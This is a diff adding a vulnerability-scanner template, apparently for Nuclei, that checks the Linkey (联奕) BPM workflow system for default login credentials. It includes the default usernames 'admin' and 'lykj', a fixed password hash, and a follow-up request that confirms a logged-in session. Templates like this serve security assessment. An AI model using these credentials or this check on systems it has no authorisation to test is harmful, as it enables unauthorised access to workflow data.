@@ -1,0 +1,78 @@
+id: linkey-bpm-default-login
+
+info:
+  name: 联奕BPM默认口令
+  author: qwtd
+  severity: high
+  description: |
+    联奕工作流引擎管理BPM系统存在默认口令漏洞
+  classification:
+    cwe-id: CWE-798
+  metadata:
+    vuln-labels: 两高一弱,弱口令
+  tags: 联奕工作流引擎管理BPM系统
+
+http:
+  - raw:
+      - |
+        POST /bpm/login HTTP/1.1
+        Host: {{Hostname}}
+        Connection: keep-alive
+        Content-Length: 90
+        Cache-Control: max-age=0
+        sec-ch-ua: "Google Chrome";v="149", "Chromium";v="149", "Not)A;Brand";v="24"
+        sec-ch-ua-mobile: ?0
+        sec-ch-ua-platform: "macOS"
+        Upgrade-Insecure-Requests: 1
+        Content-Type: application/x-www-form-urlencoded
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+        Sec-Fetch-Site: same-origin
+        Sec-Fetch-Mode: navigate
+        Sec-Fetch-User: ?1
+        Sec-Fetch-Dest: document
+        Accept-Encoding: gzip, deflate, br, zstd
+        Accept-Language: zh-CN,zh;q=0.9
+
+        UserName={{username}}&Password=e485755ba705d80d9841f18d21aa2265&x=71&y=15&gourl=r%3Fwf_num%3DS005
+
+    payloads:
+      username:
+        - admin
+        - lykj
+
+    cookie-reuse: true
+    matchers:
+      - type: status
+        status:
+          - 302
+        internal: true
+
+  - raw:
+      - |
+        GET /bpm/navtree?wf_num=T_S005_001 HTTP/1.1
+        Host: {{Hostname}}
+        Connection: keep-alive
+        sec-ch-ua-platform: "macOS"
+        X-Requested-With: XMLHttpRequest
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36
+        Accept: application/json, text/javascript, */*; q=0.01
+        sec-ch-ua: "Google Chrome";v="149", "Chromium";v="149", "Not)A;Brand";v="24"
+        sec-ch-ua-mobile: ?0
+        Sec-Fetch-Site: same-origin
+        Sec-Fetch-Mode: cors
+        Sec-Fetch-Dest: empty
+        Accept-Encoding: gzip, deflate, br, zstd
+        Accept-Language: zh-CN,zh;q=0.9
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - 'WF_OrUnid'
+          - 'Treeid'
+          - 'Itemid'
+        condition: and
